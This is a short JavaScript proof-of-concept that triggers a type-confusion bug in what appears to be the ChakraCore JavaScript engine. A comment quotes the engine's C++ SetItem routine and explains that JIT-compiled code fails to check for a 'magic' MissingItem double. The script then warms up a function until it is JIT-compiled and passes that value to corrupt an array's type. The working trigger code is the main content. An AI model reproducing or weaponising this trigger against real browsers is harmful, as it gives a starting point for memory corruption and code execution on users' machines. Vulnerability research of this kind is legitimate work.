/*
BOOL JavascriptNativeFloatArray::SetItem(uint32 index, double dValue)
{
    if (*(uint64*)&dValue == *(uint64*)&JavascriptNativeFloatArray::MissingItem)
    {
        JavascriptArray *varArr = JavascriptNativeFloatArray::ToVarArray(this);
        varArr->DirectSetItemAt(index, JavascriptNumber::ToVarNoCheck(dValue, GetScriptContext()));
        return TRUE;
    }

    this->DirectSetItemAt<double>(index, dValue);
    return TRUE;
}

As you can see above, if the double value given as the parameter equals to JavascriptNativeFloatArray::MissingItem, it converts the float array to a var array. Since the input value is not checked in the JITed code, it can lead to type confusion.
*/

function opt(arr, value) {
    arr[1] = value;
    arr[0] = 2.3023e-320;
}

function main() {
    for (let i = 0; i < 0x10000; i++)
        opt([1.1], 2.2);

    let arr = [1.1];
    opt(arr, -5.3049894784e-314);  // MAGIC VALUE!

    print(arr);
}

main();